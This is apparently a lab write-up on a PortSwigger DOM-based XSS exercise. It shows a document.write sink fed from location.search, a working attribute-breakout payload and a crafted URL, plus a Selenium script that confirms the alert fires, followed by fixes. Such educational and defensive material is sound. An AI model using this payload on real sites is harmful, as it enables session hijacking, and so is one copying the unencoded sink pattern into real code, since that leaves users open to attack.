---
title: "DOM XSS in document.write sink using source location.search"
date: 2026-08-24 09:00:00 -0500
categories: [PortSwigger, Cross-site-scripting]
tags: [portswigger, cwe-79, xss, dom-based, document-write, location-search]
description: "Client-side XSS that never touches the server response: a script reads the URL query string and writes it straight into the page with document.write. Break out of the img src attribute with \"><svg onload=alert(1)> and the alert fires from a plain link."
image:
    path: /assets/Images/PortSwigger-avatar.png
    alt: DOM XSS in document.write sink using source location.search
---

## Overview

This lab is a **DOM-based** [cross-site scripting](https://cwe.mitre.org/data/definitions/79.html) ([CWE-79](https://cwe.mitre.org/data/definitions/79.html)) bug. Unlike reflected or stored XSS, the payload is never processed by the server — the entire vulnerability lives in client-side JavaScript. The server sends down a clean page, and a script on that page takes attacker-controlled input from the URL and writes it into the document itself.

## The vulnerable code

The home page search runs this JavaScript:

```js
var query = (new URLSearchParams(window.location.search)).get('search');
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
```

Two ingredients make this exploitable:

- **A source** — `location.search`, the part of the URL after `?`. The attacker fully controls it.
- **A sink** — `document.write`, which parses whatever string you give it as live HTML and inserts it into the page.

The `search` value is concatenated directly into an `<img>` tag with no encoding, so whatever you put in the query string becomes part of the page's markup.

## The technique

The injected value lands **inside a double-quoted attribute** (`src="...searchTerms=VALUE"`). To escape it you close the quote and the tag, then add your own element:

```
"><svg onload=alert(1)>
```

The `"` ends the `src` attribute, the `>` ends the `<img>` tag, and then `<svg onload=alert(1)>` is a fresh element whose `onload` handler runs as soon as it renders.

Delivered as a URL (the query string is URL-encoded):

```
https://TARGET/?search=%22%3E%3Csvg%20onload%3Dalert%281%29%3E
```

`document.write` then emits:

```html
<img src="/resources/images/tracker.gif?searchTerms="><svg onload=alert(1)>">
```

and the browser fires `alert(1)`.

Because the source is the query string — not the `#` fragment — the exploit is just a link. Anyone who clicks it runs the script in their own session, with no exploit server and nothing stored on the server. (Confirming it requires a real JavaScript engine, since the bug never appears in the raw HTML: load the crafted URL in a browser and the alert pops.)

## Reproducing it

Since the bug never appears in the raw HTML, `curl` can't prove it — you need a real JavaScript engine. Headless chromium driven by selenium does the job (the chromedriver that ships with Kali's `chromium` package; note that playwright won't run here because its driver needs `/usr/bin/node`, which minimal Kali doesn't have):

```python
import urllib.parse, time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

base = "https://TARGET/"
url = base + "?search=" + urllib.parse.quote('"><svg onload=alert(1)>')
o = Options()
for a in ["--headless=new", "--no-sandbox", "--disable-dev-shm-usage",
          "--disable-gpu", "--ignore-certificate-errors"]:
    o.add_argument(a)
d = webdriver.Chrome(service=Service("/usr/bin/chromedriver"), options=o)
d.get(url)
time.sleep(2)
al = d.switch_to.alert        # raises if the payload did NOT run
print("ALERT FIRED, text:", al.text)
al.accept()
d.quit()
```

`ALERT FIRED, text: 1` confirms the DOM sink executed.

## Why it matters

A working `alert(1)` is the proof of concept; the real impact is anything that JavaScript can do in the victim's session — stealing a non-HttpOnly session cookie, performing authenticated actions as the victim, or pivoting to account takeover. All it takes is getting the target to open a link.

## The fix

- **Don't feed untrusted input to dangerous sinks.** Avoid `document.write`, `innerHTML`, and `eval` with attacker-controlled data. Build nodes with `textContent` / `document.createElement` so input is treated as data, not markup.
- **Context-encode** if you must insert into HTML — here, HTML-attribute-encode `"` and `>` before writing.
- **Content-Security-Policy** that forbids inline event handlers is useful defense in depth.
